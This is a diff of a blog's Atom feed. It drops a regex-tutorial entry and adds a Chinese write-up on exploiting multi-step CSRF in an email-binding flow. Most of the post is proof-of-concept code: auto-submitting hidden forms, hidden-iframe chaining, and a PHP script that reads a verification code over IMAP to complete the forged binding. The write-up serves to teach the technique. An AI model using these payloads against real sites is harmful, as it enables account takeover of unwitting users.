@@ -215,23 +215,6 @@ divEl.innerHTML = payload;
   </entry>
   
   <entry>
-    <title><![CDATA[正则表达式练级]]></title>
-    <link href="http://xdxd.love/2016/03/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%83%E7%BA%A7/"/>
-    <id>http://xdxd.love/2016/03/10/正则表达式练级/</id>
-    <published>2016-03-10T07:16:33.000Z</published>
-    <updated>2016-03-10T07:27:04.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="external">正则表达式入门教程</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="external">正则表达式入门教程</a></p>
-]]>
-    </summary>
-    
-      <category term="软件开发" scheme="http://xdxd.love/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
-    
-  </entry>
-  
-  <entry>
     <title><![CDATA[referer安全技术攻防]]></title>
     <link href="http://xdxd.love/2016/03/10/referer%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%94%BB%E9%98%B2/"/>
     <id>http://xdxd.love/2016/03/10/referer安全技术攻防/</id>
@@ -907,6 +890,114 @@ print binascii.<span class="function"><span class="title">crc32</span><span clas
       <category term="xposed" scheme="http://xdxd.love/tags/xposed/"/>
     
       <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[多步csrf漏洞场景及其利用]]></title>
+    <link href="http://xdxd.love/2015/12/24/%E5%A4%9A%E6%AD%A5csrf%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/"/>
+    <id>http://xdxd.love/2015/12/24/多步csrf漏洞场景及其利用/</id>
+    <published>2015-12-24T09:05:22.000Z</published>
+    <updated>2015-12-25T02:00:31.000Z</updated>
+    <content type="html"><![CDATA[<p>发布在了<a href="http://www.freebuf.com/articles/web/58387.html" target="_blank" rel="external">Freebuf</a>上，有删改。</p>
+<p>CSRF的漏洞原理和利用方式这里就不多赘述了。平时大家讨论的CSRF利用多是发送一次请求。比如CSRF刷粉丝，CSRF发微博。这里主要讨论一个稍微复杂点的利用场景。</p>
+<p>最近在众测的时候遇到一个案例，用户绑定邮箱的请求没有防御CSRF。但是大家都知道绑定邮箱这个操作不是一步完成了。这次遇到的这个案例是这样的。用户发送一个申请绑定邮箱的请求，服务器给该邮箱发送一个验证码，然后用户在页面中输入验证码完成绑定。</p>
+<p><img src="/images/mulcsrf1.jpg" alt=""></p>
+<p>从上图的路程中可以看出。按照常见的csrf的漏洞来说，这里是没法利用的。因为即使我们伪造了请求，让用户发出了绑定申请的邮件，还需要用户把这个验证码在页面上输入才行。经过更进一步的分析发现，图中4这一步也是没有防御CSRF的。也就是说我们可以伪造两次请求来实现CSRF绑定邮箱。这样一个场景就是比较典型的多步CSRF。</p>
+<p>有了思路就可以开始写demo了。最初的想法：是不是用两个表单就可以了呢。</p>
+<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
+<span class="tag">&lt;<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>  <span class="attribute">action</span>=<span class="value">" https://www.example.com/first.aspx"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test1"</span> <span class="attribute">value</span>=<span class="value">"1"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form1"</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
+<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form2"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>  <span class="attribute">action</span>=<span class="value">" https://www.example.com/second.aspx"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test2"</span> <span class="attribute">value</span>=<span class="value">"2"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form2"</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
+<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
+<span class="built_in">document</span>.getElementById(<span class="string">"form1"</span>).submit();
+<span class="built_in">window</span>.setTimeout( <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{ <span class="built_in">document</span>.forms.form2.submit()}, <span class="number">12000</span>); 
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
+</code></pre><p>测试发现这想法太天真了。第一个表单提交之后，就会跳转到返回的结果页面了。第二个表单不会提交了。而且这里遇到的这个场景比较特殊，并不是仅仅是先后提交两个表单就可以了。第二个表单里的值(验证码)是需要第一个表单提交之后，从邮箱里读出来再放到第二个表单里。<br>测试结果见下图：只会发送第一个表单的请求。</p>
+<p><img src="/images/mulcsrf2.gif" alt=""></p>
+<p>经过查找资料。找到几个解决方案。</p>
+<p>解决方案1：<br>使用form的target属性。target 属性规定在何处打开 action URL。</p>
+<p><img src="/images/mulcsrf3.jpg!small" alt=""></p>
+<p>根据查到的资料。默认是_self。所以会跳到结果页。我们使用_blank试试。</p>
+<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
+<span class="tag">&lt;<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>  <span class="attribute">target</span>=<span class="value">'_blank'</span> <span class="attribute">action</span>=<span class="value">" https://www.example.com/first.aspx"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test1"</span> <span class="attribute">value</span>=<span class="value">"1"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form1"</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
+<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form2"</span> <span class="attribute">method</span>=<span class="value">"POST"</span> <span class="attribute">target</span>=<span class="value">'_blank'</span> <span class="attribute">action</span>=<span class="value">" https://www.example.com/second.aspx"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test2"</span> <span class="attribute">value</span>=<span class="value">"2"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form2"</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
+<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
+<span class="built_in">document</span>.getElementById(<span class="string">"form1"</span>).submit();
+<span class="built_in">window</span>.setTimeout( <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{ <span class="built_in">document</span>.forms.form2.submit()}, <span class="number">12000</span>); 
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
+</code></pre><p>这种方式可以实现两次post的需求，不过太过暴力。需要新弹出窗口不说。弹出窗口也很可能被浏览器拦截掉。</p>
+<p><img src="/images/mulcsrf4.gif" alt=""></p>
+<p>解决方案2：</p>
+<p>target可以选择一个frame。framename  在指定的框架中打开。<br>所以可以这样写。这样子可以比较优雅的发两个post请求。</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;form id=<span class="string">"form1"</span> <span class="keyword">method</span>=<span class="string">"POST"</span> target='csrfIframe1' action=<span class="string">"https://www.baidu.com/first.aspx"</span>&gt;
+&lt;input <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"test1"</span> value=<span class="string">"1"</span>&gt;
+&lt;input <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"form1"</span>&gt;
+&lt;/form&gt;
+&lt;form id=<span class="string">"form2"</span> <span class="keyword">method</span>=<span class="string">"POST"</span> target='csrfIframe2' action=<span class="string">"https://www.baidu.com/second.aspx"</span>&gt;
+&lt;input <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"test2"</span> value=<span class="string">"2"</span>&gt;
+&lt;input <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"form2"</span>&gt;
+&lt;/form&gt;
+window.onload = function() {
+document.getElementById(<span class="string">"form1"</span>).submit();
+// to make <span class="number">2</span>nd form wait <span class="keyword">for</span> <span class="number">1</span>st, put the following <span class="keyword">in</span> a function <span class="keyword">and</span> use <span class="keyword">as</span> a callback <span class="keyword">for</span> a new timer
+document.getElementById(<span class="string">"form2"</span>).submit();
+}
+&lt;/script&gt;
+&lt;iframe style=<span class="string">"display: hidden"</span> height=<span class="string">"0"</span> width=<span class="string">"0"</span> frameborder=<span class="string">"0"</span> name=<span class="string">"csrfIframe1"</span>&gt;&lt;/iframe&gt;
+&lt;iframe style=<span class="string">"display: hidden"</span> height=<span class="string">"0"</span> width=<span class="string">"0"</span> frameborder=<span class="string">"0"</span> name=<span class="string">"csrfIframe2"</span>&gt;&lt;/iframe&gt;
+&lt;/body&gt; &lt;/html&gt;
+</code></pre><p><img src="/images/mulcsrf5.gif" alt=""></p>
+<p>解决方案3<br>使用iframe自然也是可以的。类似</p>
+<pre><code>&lt;<span class="tag">iframe</span> src=<span class="string">"2post3.html"</span> <span class="attribute">width</span>=<span class="string">"0"</span> <span class="attribute">height</span>=<span class="string">"0"</span>&gt;
+&lt;/iframe&gt;
+&lt;<span class="tag">iframe</span> src=<span class="string">"2post4.html"</span> <span class="attribute">width</span>=<span class="string">"0"</span> <span class="attribute">height</span>=<span class="string">"0"</span>&gt;
+&lt;/iframe&gt;
+</code></pre><p>就不演示了。</p>
+<h2 id="具体到邮箱验证这个场景我使用了如下的一个poc">具体到邮箱验证这个场景我使用了如下的一个poc</h2><p>文件1：发送申请邮箱绑定的请求：</p>
+<pre><code>    <span class="tag">&lt;<span class="title">html</span>&gt;</span>
+    <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+    <span class="tag">&lt;<span class="title">body</span>&gt;</span>
+    <span class="comment">&lt;!-- hidden iframes --&gt;</span>
+    <span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">style</span>=<span class="value">"display: hidden"</span> <span class="attribute">height</span>=<span class="value">"100"</span> <span class="attribute">width</span>=<span class="value">"100"</span> <span class="attribute">frameborder</span>=<span class="value">"0"</span> <span class="attribute">name</span>=<span class="value">"csrfIframe1"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span>
+    <span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">action</span>=<span class="value">"http://xxxxxxxxxxx/security"</span> <span class="attribute">method</span>=<span class="value">"POST"</span> <span class="attribute">target</span>=<span class="value">"csrfIframe1"</span>&gt;</span>
+    <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"email"</span> <span class="attribute">value</span>=<span class="value">"邮箱@qq.com"</span> /&gt;</span>
+<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
+<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
+<span class="built_in">document</span>.getElementById(<span class="string">"form1"</span>).submit();
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
+<span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">style</span>=<span class="value">"display: hidden"</span> <span class="attribute">height</span>=<span class="value">"100"</span> <span class="attribute">width</span>=<span class="value">"100"</span> <span class="attribute">frameborder</span>=<span class="value">"0"</span> <span class="attribute">name</span>=<span class="value">"csrfIframe22"</span> <span class="attribute">src</span>=<span class="value">"http://localhost/test/mail.php"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
+</code></pre><p>文件2：iframe的文件需要去邮箱获取验证码拼到表单里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?php&#10;$mail = &#39;mail@qq.com&#39;;&#10;$mailPass = &#39;pass&#39;;&#10;// sleep(5);&#10;//&#20197;&#33150;&#35759;&#20225;&#19994;&#37038;&#31665;&#20570;&#20102;&#27979;&#35797;&#10;$mailServer=&#34;imap.qq.com&#34;; //IMAP&#20027;&#26426;&#10;$mailLink=&#34;&#123;&#123;$mailServer&#125;:993/ssl&#125;INBOX&#34; ; //imagp&#36830;&#25509;&#22320;&#22336;&#65306;&#19981;&#21516;&#20027;&#26426;&#22320;&#22336;&#19981;&#21516;&#10;$mailUser = $mail; //&#37038;&#31665;&#29992;&#25143;&#21517;&#10;//&#37038;&#31665;&#23494;&#30721;&#10;$mbox = imap_open($mailLink,$mailUser,$mailPass) or die(&#34;can&#39;t connect: &#34; . imap_last_error()); //&#24320;&#21551;&#20449;&#31665;imap_open&#10;$totalrows = imap_num_msg($mbox);&#10;// echo $totalrows;//&#21462;&#24471;&#20449;&#20214;&#25968;&#10;$numcode = &#39;&#39;;&#10;// $headers = imap_fetchheader($mbox, $i); //&#33719;&#21462;&#20449;&#20214;&#26631;&#22836;&#10;// echo $headers;&#10;// $headArr = matchMailHead($headers); //&#21305;&#37197;&#20449;&#20214;&#26631;&#22836;&#10;// var_dump($headArr);&#10;$mailBody = imap_fetchbody($mbox, $totalrows, 1); //&#33719;&#21462;&#26368;&#26032;&#30340;&#19968;&#23553;&#21491;&#38190;&#10;$mailBody = base64_decode($mailBody);&#10;preg_match(&#39;/\d&#123;6&#125;/&#39;,$mailBody,$res);//&#21305;&#37197;&#39564;&#35777;&#30721;&#10;// print_r($res); //&#33719;&#21462;&#20449;&#20214;&#27491;&#25991;&#10;// echo $res[0];&#10;$numcode = $res[0];&#10;echo $numcode;&#10;$form2 = &#39;&#60;html&#62;&#10;&#60;body&#62;&#10;&#60;form id=&#34;form2&#34; action=&#34;http:xxxxxx&#34; method=&#34;POST&#34; target=&#34;csrfIframe2&#34;&#62;&#10;&#60;input type=&#34;hidden&#34; name=&#34;captchacode&#34; value=&#34;&#39;.$numcode.&#39;&#34; /&#62;&#10;&#60;input type=&#34;hidden&#34; name=&#34;email&#34; value=&#34;&#39;.$mail.&#39;&#34; /&#62;&#10;&#60;/form&#62;&#10;&#60;script&#62;&#10;document.getElementById(&#34;form2&#34;).submit();&#60;/script&#62;&#10;&#60;/body&#62;&#10;&#60;/html&#62;&#39;;&#10;echo $form2;</span><br></pre></td></tr></table></figure></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>发布在了<a href="http://www.freebuf.com/articles/web/58387.html" target="_blank" rel="external">Freebuf</a>上，有删改。</p>
+<p>CSRF的漏洞原理和利用方式这里就不多赘]]>
+    </summary>
+    
+      <category term="csrf" scheme="http://xdxd.love/tags/csrf/"/>
+    
+      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
